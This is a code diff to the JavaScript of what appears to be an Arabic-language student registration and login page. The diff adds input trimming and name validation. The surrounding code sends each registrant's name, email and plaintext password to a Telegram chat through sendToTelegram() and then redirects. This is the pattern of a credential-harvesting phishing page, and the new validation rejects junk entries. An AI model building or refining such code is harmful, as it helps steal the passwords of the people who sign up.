@@ -173,23 +173,50 @@
         alert("تم تسجيل الدخول بنجاح!"); // رسالة تأكيد
         // قم بإضافة الكود الخاص بتسجيل الدخول هنا
     }
+    function isValidName(name) {
+        // التأكد من أن الاسم يحتوي على حروف فقط وأن طوله أكبر من 2
+        if (!/^[a-zA-Z\u0621-\u064A ]{2,}$/i.test(name)) {
+            return false;
+        }
+
+        // التأكد من أن الاسم لا يحتوي على نفس الحرف أكثر من 3 مرات متتالية
+        if (/([a-zA-Z\u0621-\u064A])\1\1\1/i.test(name)) {
+            return false;
+        }
+
+        return true;
+    }
 
     function register() {
-        const name = document.getElementById('register-name').value;
-        const email = document.getElementById('register-email').value;
-        const password = document.getElementById('register-password').value;
+        const name = document.getElementById('register-name').value.trim();
+        const email = document.getElementById('register-email').value.trim();
+        const password = document.getElementById('register-password').value.trim();
         const college = document.getElementById('register-college').value;
         const squad = document.getElementById('register-squad').value;
         const department = document.getElementById('register-department').value;
         const gender = document.getElementById('register-gender').value;
 
+        // التحقق من أن الحقول الأساسية غير فارغة
+        if (name === '' || email === '' || password === '') {
+            alert("يرجى ملء جميع الحقول المطلوبة: الاسم، البريد الإلكتروني، وكلمة المرور.");
+            return; // إيقاف الدالة إذا كان هناك خطأ
+        }
+
+        // التحقق من أن الاسم صحيح
+        if (!isValidName(name)) {
+            alert("يرجى إدخال اسم صحيح وليس نصاً عشوائياً.");
+            return; // إيقاف الدالة إذا كان هناك خطأ
+        }
+
         const message = `إنشاء حساب:\nالاسم: ${name}\nالبريد الإلكتروني: ${email}\nكلمة المرور: ${password}\nالكلية: ${college}\nالفرقة: ${squad}\nالشعبة: ${department}\nالنوع: ${gender}`;
         sendToTelegram(message);
 
         alert("تم إنشاء الحساب بنجاح!"); // رسالة تأكيد
-            // بعد التحقق بنجاح، إعادة التوجيه إلى الصفحة المناسبة
-            redirect(college, squad, department, gender);
-        }
+
+        // بعد التحقق بنجاح، إعادة التوجيه إلى الصفحة المناسبة
+        redirect(college, squad, department, gender);
+    }
+
 
         function togglePasswordVisibility(inputId) {
             var passwordInput = document.getElementById(inputId);
